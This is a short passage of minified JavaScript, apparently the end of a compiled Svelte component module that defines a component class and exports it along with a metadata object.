Ss.$$set=w=>{b(0,f=Zc(Zc({},f),Pk(w)))},f=Pk(f),[f]}class N_ extends E_{constructor(f){super(),h_(this,f,U_,O_,x_,{})}}export{N_ as default,Ok as metadata};
